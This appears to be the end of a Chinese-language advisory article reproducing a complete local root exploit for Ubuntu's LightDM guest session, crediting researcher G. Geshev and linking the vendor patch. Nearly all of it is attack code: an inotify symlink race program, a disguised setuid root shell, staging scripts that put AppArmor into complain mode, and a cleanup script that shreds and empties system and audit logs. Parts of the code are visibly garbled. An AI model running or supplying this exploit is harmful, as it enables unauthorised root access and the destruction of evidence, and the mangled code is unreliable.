                    system("/bin/rm -rf /tmp/old.*");
                    inotify_rm_watch(fd, wd);
                    close(fd);
                    exit(0);
                  }
                }
              }
            }
          }
        }
      }
    }
boclocal.c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define EVENT_SIZE(sizeof(struct inotify_event))
    #define EVENT_BUF_LEN(1024 * (EVENT_SIZE + 16))
    int main(void) {
      struct stat info;
      struct passwd * pw;
      struct inotify_event * event;
      pw = getpwnam("root");
      if (pw == NULL) exit(0);
      char newpath[20] = "old.";
      int length = 0, i, fd, wd, count1 = 0, count2 = 0;
      int a, b, c;
      char buffer[EVENT_BUF_LEN];
      fd = inotify_init();
      if (fd  0) {
          event = (struct inotify_event * ) buffer;
          if (event - > len) {
            if (strstr(event - > name, "guest-") != NULL) {
              for (i = 0; event - > name[i] != ''; i++) {
                event - > name[i] = tolower(event - > name[i]);
              }
              if (event - > mask & IN_CREATE) mkdir(event - > name, ACCESSPERMS);
              if (event - > mask & IN_MOVED_FROM) {
                rename(event - > name, strncat(newpath, event - > name, 15));
                symlink("/usr/local/sbin/", event - > name);
                while (1) {
                  count1 = count1 + 1;
                  pw = getpwnam(event - > name);
                  if (pw != NULL) break;
                }
                while (1) {
                  count2 = count2 + 1;
                  stat("/usr/local/sbin/", & info);
                  if (info.st_uid == pw - > pw_uid) {
                    a = unlink(event - > name);
                    b = mkdir(event - > name, ACCESSPERMS);
                    c = symlink("/var/tmp/kodek/bin/", strncat(event - > name, "/bin", 5));
                    if (a == 0 && b == 0 && c == 0) {
                      printf("n[!] GAME OVER !!!n[!] count1: %i count2: %in[!] w8 1 minute and run /bin/subashn", count1, count2);
                    } else {
                      printf("n[!] a: %i b: %i c: %in[!] exploit failed !!!n[!] w8 1 minute and run it againn", a, b, c);
                    }
                    system("/bin/rm -rf /tmp/old.*");
                    inotify_rm_watch(fd, wd);
                    close(fd);
                    exit(0);
                  }
                }
              }
            }
          }
        }
      }
    }
clean.sh
    #!/bin/bash
    if [ "$(/usr/bin/id -u)" != "0" ]; then
       echo "This script must be run as root" 1>&2
       exit 1
    fi
    /bin/rm -rf /tmp/guest-* /tmp/old.guest-*
    /usr/bin/shred -fu /var/tmp/run.sh /var/tmp/shell /var/tmp/boc /var/log/kern.log /var/log/audit/audit.log /var/log/lightdm/*
    /bin/echo > /var/log/auth.log
    /bin/echo > /var/log/syslog
    /bin/dmesg -c >/dev/null 2>&1
    /bin/echo "Do you want to remove exploit (y/n)?"
    read answer
    if [ "$answer" == "y" ]; then
    /usr/bin/shred -fu /var/tmp/kodek/* /var/tmp/kodek/bin/*
    /bin/rm -rf /var/tmp/kodek
    else
    exit
    fi
    run.sh
    #!/bin/sh
    /bin/cat  /usr/local/sbin/getent
    #!/bin/bash
    /bin/cp /var/tmp/shell /bin/subash >/dev/null 2>&1
    /bin/chmod 4111 /bin/subash >/dev/null 2>&1
    COUNTER=0
    while [ $COUNTER -lt 10 ]; do
    /bin/umount -lf /usr/local/sbin/ >/dev/null 2>&1
    let COUNTER=COUNTER+1
    done
    /bin/sed -i 's//usr/lib/lightdm/lightdm-guest-session {//usr/lib/lightdm/lightdm-guest-session flags=(complain) {/g' /etc/apparmor.d/lightdm-guest-session >/dev/null 2>&1
    /sbin/apparmor_parser -r /etc/apparmor.d/lightdm-guest-session >/dev/null 2>&1
    /usr/bin/getent passwd "$2"
    EOF
    /bin/chmod 755 /usr/local/sbin/getent >/dev/null 2>&1
shell.c
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    int main(void)
    {
        setresuid(0, 0, 0);
        setresgid(0, 0, 0);
        setgroups(0, NULL);
        putenv("HISTFILE=/dev/null");
        execl("/bin/bash", "[bioset]", "-pi", NULL);
        return 0;
    }
stage1.sh
    #!/bin/bash
    if [ "${PWD}" == "/var/tmp/kodek" ]; then
    /usr/bin/killall -9 /var/tmp/boc >/dev/null 2>&1
    /usr/bin/killall -9 boc >/dev/null 2>&1
    /bin/sleep 3s
    /usr/bin/shred -fu /var/tmp/run.sh /var/tmp/shell /var/tmp/boc >/dev/null 2>&1
    /usr/bin/gcc boc.c -Wall -s -o /var/tmp/boc
    /usr/bin/gcc shell.c -Wall -s -o /var/tmp/shell
    /bin/cp /var/tmp/kodek/run.sh /var/tmp/run.sh
    /var/tmp/boc
    else
    echo "[!] run me from /var/tmp/kodek"
    exit
    fi
stage1local.sh
    #!/bin/bash
    if [ "${PWD}" == "/var/tmp/kodek" ]; then
    /usr/bin/killall -9 /var/tmp/boc >/dev/null 2>&1
    /usr/bin/killall -9 boc >/dev/null 2>&1
    /bin/sleep 3s
    /usr/bin/shred -fu /var/tmp/run.sh /var/tmp/shell /var/tmp/boc >/dev/null 2>&1
    /usr/bin/gcc boclocal.c -Wall -s -o /var/tmp/boc
    /usr/bin/gcc shell.c -Wall -s -o /var/tmp/shell
    /bin/cp /var/tmp/kodek/run.sh /var/tmp/run.sh
    /var/tmp/boc &
    /bin/sleep 5s
    XDG_SEAT_PATH="/org/freedesktop/DisplayManager/Seat0" /usr/bin/dm-tool lock
    XDG_SEAT_PATH="/org/freedesktop/DisplayManager/Seat0" /usr/bin/dm-tool switch-to-guest
    else
    echo "[!] run me from /var/tmp/kodek"
    exit
    fi
stage2.sh
    #!/bin/sh
    /usr/bin/systemd-run --user /var/tmp/run.sh
    /bin/cat
    #!/bin/sh
    /usr/bin/systemd-run --user /var/tmp/run.sh
    /bin/sleep 15s
    /bin/loginctl terminate-session `/bin/loginctl session-status | /usr/bin/head -1 | /usr/bin/awk '{ print $1 }'`
**四、其他说明**
独立安全研究员G. Geshev（@munmap）已将该漏洞提交至Beyond
Security公司的SecuriTeam安全公告计划。厂商已经发布了补丁来修复此问题，更多细节可以参考[此链接](https://www.ubuntu.com/usn/usn-3255-1/)。